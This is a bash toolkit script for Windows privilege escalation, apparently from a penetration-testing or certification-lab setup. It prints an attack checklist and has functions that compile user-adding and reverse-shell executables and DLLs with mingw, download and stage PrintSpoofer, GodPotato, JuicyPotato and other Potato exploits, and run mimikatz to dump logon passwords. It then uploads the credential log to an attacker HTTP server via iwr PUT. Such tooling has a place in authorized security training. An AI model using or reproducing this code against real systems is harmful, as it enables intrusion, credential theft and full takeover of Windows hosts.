#!/bin/bash
SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")
windows_escalate_strategy() {
    echo "If access is not powershell (net cat, winrm), try to get the password via responder"
    echo "start_responder"
    host_ip=$(get_host_ip)
    echo 'dir \\'$host_ip'\test'
    echo 'get_responder_ntlm'
    echo 'get_ntlm_password'
    echo 'If password available and RDP available, log in'
    echo 'run_xfreerdp'
    echo 'shell=$(get_powershell_reverse_shell)'
    echo 'cut and paste into a powershell prompt'
    echo 'alternatively, start a interactive powershell'
    echo "If you have powershell, run the following commands"
    echo "whoami /priv"
    echo "whoami /groups"
    echo "Get-LocalUser"
    echo "Get-LocalGroup"
    echo "Get-LocalGroupMember Administators"
    echo "systeminfo"
    echo "ipconfig /all"
    echo "route print"
    echo "netstat -ano"
    echo 'Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname'
    echo 'Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname'
    echo 'reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s /v DisplayName'
    echo 'Get-Process'
    echo 'tasklist'
    echo 'Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue'
    echo 'dir /s /b | findstr /e "kdbx"'
    echo 'Search suspicious folders'    
    echo 'Get-ChildItem -Path C:\suspected_folder -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue'
    echo 'dir /s /b | findstr /e "txt ini"'
    echo 'Get-History'
    echo '(Get-PSReadlineOption).HistorySavePath'
    echo 'Type the history file'
    echo 'Type the transcript file if any'
    echo 'Use evil-winrm to connect to a ps session'
    echo 'Use automated enumeratio with winPEAS'
    echo 'cp /usr/share/peass/winpeas/winPEASx64.exe .'
    echo '$(generate_windows_download "winPEASx64.exe")'
    echo '.\winPEASx64.exe'
    echo "Service Binary Hijacking"
    echo "At this point, you must have a proper powershell session via rdp or otherwise"
    echo 'Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like "Running"}'
    echo 'wmic service where (state="Running") get Name,State,PathName'
    echo 'To see specific logonuser, sc qc servicename'
    echo 'run icacls to see if you have permission to modify/write the files'
    echo 'if you do, create the exe reverse shell'
    echo 'DLL Hijacking'
    echo 'Investigate the applications to see if therei is anything interesting'
    echo 'Unquoted service paths'
    echo 'Get-CimInstance -ClassName win32_service | Select Name,State,PathName'
    echo 'wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """"'
    echo 'net start'
    echo 'Check task scheduler'
    echo 'schtasks /query /fo LIST /v'
    echo 'Use windows exploits'

}

create_add_user() {
    local username="$1"
    local password="$2"
    if [ -z "$username" ]; then
        username="attacker"
    fi
    if [ -z "$password" ]; then
        password="Password123!"
    fi
    cp "$SCRIPTDIR/../c/add_user.c" .
    sed -E -i 's/\{username\}/'"$username"'/g' add_user.c
    sed -E -i 's/\{password\}/'"$password"'/g' add_user.c
    x86_64-w64-mingw32-gcc -o add_user.exe add_user.c 
}

create_add_user_dll() {
    local username="$1"
    local password="$2"
    if [ -z "$username" ]; then
        username="attacker"
    fi
    if [ -z "$password" ]; then
        password="Password123!"
    fi
    cp "$SCRIPTDIR/../c/add_user_dll.cpp" .
    sed -E -i 's/\{username\}/'"$username"'/g' add_user_dll.cpp
    sed -E -i 's/\{password\}/'"$password"'/g' add_user_dll.cpp
    x86_64-w64-mingw32-gcc -shared -o add_user.dll add_user_dll.cpp 
}

create_change_password() {
    local username="$1"
    local password="$2"
    if [ -z "$username" ]; then
        echo "Username is required for changing password."
        exit 1
    fi
    if [ -z "$password" ]; then
        password="Password123!"
    fi
    cp "$SCRIPTDIR/../c/change_password.c" .
    sed -E -i 's/\{username\}/'"$username"'/g' change_password.c
    sed -E -i 's/\{password\}/'"$password"'/g' change_password.c
    x86_64-w64-mingw32-gcc -o change_password.exe change_password.c 
}

create_run_windows_shell_exe() {    
    shell=$(get_powershell_reverse_shell $1 $2)
    shell=$(escape_sed "$shell")
    cp "$SCRIPTDIR/../c/run_windows.c" run_windows_shell.c
    sed -E -i 's/\{command\}/'"$shell"'/g' run_windows_shell.c
    x86_64-w64-mingw32-gcc -o run_windows_shell.exe run_windows_shell.c 
}

create_run_windows_shell_dll() {
    shell=$(get_powershell_reverse_shell $1 $2)
    shell=$(escape_sed "$shell")
    cp "$SCRIPTDIR/../c/run_windows_dll.cpp" run_windows_shell_dll.cpp
    sed -E -i 's/\{command\}/'"$shell"'/g' run_windows_shell_dll.cpp
    x86_64-w64-mingw32-gcc -shared -o run_windows_shell.dll run_windows_shell_dll.cpp 
}

create_run_windows_exe() {
    local command=""
    if [ ! -z "$cmd" ]; then
        command="$cmd"
    fi
    if [ ! -z "$1" ]; then
        command="$1"
    fi
    command=$(escape_sed "$command")
    cp "$SCRIPTDIR/../c/run_windows.c" run_windows.c

    sed -E -i 's/\{command\}/'"$command"'/g' run_windows.c
    x86_64-w64-mingw32-gcc -o run_windows.exe run_windows.c
    generate_windows_download "run_windows.exe"
}

create_run_windows_dll() {
    local command="$1"
    if [ -z "$command" ]; then
        echo "Command is required for creating run_windows_dll."
        exit 1
    fi
    command=$(escape_sed "$command")
    cp "$SCRIPTDIR/../c/run_windows_dll.cpp" run_windows_dll.cpp
    sed -E -i 's/\{command\}/'"$command"'/g' run_windows_dll.cpp
    x86_64-w64-mingw32-gcc -shared -o run_windows.dll run_windows_dll.cpp
}

get_mimikatz() {
    cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
    generate_windows_download "mimikatz.exe"
}

run_mimikatz_logonpasswords() {
    if [[ -z "$mimikatz_log" ]]; then
        mimikatz_log=mimikatz_logonpasswords.log
    fi
    echo '.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit > '"$mimikatz_log"';'
    echo 'iwr -Uri http://'$http_ip':'$http_port'/'"$mimikatz_log"' -Infile '"$mimikatz_log"' -Method Put;'
}

netuser_create_admin_user() {
    if [[ -z "$admin_username" ]]; then
        admin_username="hacker"
    fi
    if [[ -z "$admin_password" ]]; then
        admin_password="Password123!"
    fi
    local cmd="net user $admin_username $admin_password /add"
    echo "$cmd"
}

netuser_add_admin_user_to_administrators() {
    if [[ -z "$admin_username" ]]; then
        admin_username="hacker"
    fi
    if [[ -z "$admin_password" ]]; then
        admin_password="hacker"
    fi
    local cmd="net localgroup Administrators $admin_username /add"
    echo "$cmd"
}

netuser_change_user_password() {
    local username="$1"
    local password="$2"
    if [ -z "$username" ]; then
        echo "Username is required for changing password."
        exit 1
    fi
    if [ -z "$password" ]; then
        password="Password123!"
    fi
    local cmd="net user $username $password"
    echo "$cmd"
}

#=========================
#impersonation escalations
#=========================
#rotten potato
#juicy potato
#rougewinrm
#printspoofer
#https://github.com/itm4n/PrintSpoofer
#god potato
#sigma potato

perform_printspoofer() {
    local printspoofer_url="https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe"
    if [[ ! -f "printspoofer.exe" ]]; then
        echo "Downloading PrintSpoofer..." >> $trail_log
        wget "$printspoofer_url" -O printspoofer.exe >> $trail_log
    fi
    echo 'cd C:\windows\temp;'
    generate_windows_download "printspoofer.exe"
    if [[ -z "$cmd" ]]; then
        cmd=$(get_powershell_interactive_shell)
    fi
    echo ".\printspoofer.exe -c \"$cmd\""
}


perform_god_potato() {
    local god_potato_url="https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe"
    if [[ ! -f "god_potato.exe" ]]; then
        echo "Downloading GodPotato..." >> $trail_log
        wget "$god_potato_url" -O god_potato.exe >> $trail_log
    fi
    echo 'cd C:\windows\temp;'
    generate_windows_download "god_potato.exe"
    if [[ -z "$cmd" ]]; then
        cmd=$(get_powershell_interactive_shell)
    fi
    echo ".\god_potato.exe -cmd \"$cmd\""
}

perform_sigma_potato() {
    local sigma_potato_url="https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe"
    if [[ ! -f "sigma_potato.exe" ]]; then
        echo "Downloading SigmaPotato..." >> $trail_log
        wget "$sigma_potato_url" -O sigma_potato.exe >> $trail_log
    fi
    echo 'cd C:\windows\temp;'
    generate_windows_download "sigma_potato.exe"
    if [[ -z "$cmd" ]]; then
        cmd=$(get_powershell_interactive_shell)
    fi
    echo ".\sigma_potato.exe \"$cmd\""
}

perform_juicy_potato(){

    local url="https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe"
    if [[ ! -f "JuicyPotato.exe" ]]; then
        echo "Downloading JuicyPotato..." >> $trail_log
        wget "$url" -O JuicyPotato.exe >> $trail_log
    fi
    echo 'cd C:\windows\temp;'
    generate_windows_download "JuicyPotato.exe"
    if [[ -z "$cmd" ]]; then
        cmd=$(get_powershell_interactive_shell)
    fi
    echo ".\JuicyPotato.exe -a \"$cmd\""
}

perform_local_potato() {
    local url="https://github.com/decoder-it/LocalPotato/releases/download/v1.1/LocalPotato.zip"
    if [[ ! -f LocalPotato.zip ]]; then
        echo "Downloading LocalPotato..." >> $trail_log
        wget "$url" -O LocalPotato.zip >> $trail_log
        unzip LocalPotato.zip
    fi
    echo 'cd C:\windows\temp;'
    generate_windows_download "LocalPotato.exe"
    if [[ -z "$cmd" ]]; then
        cmd=$(get_powershell_interactive_shell)
    fi
    echo ".\LocalPotato.exe \"$cmd\""
}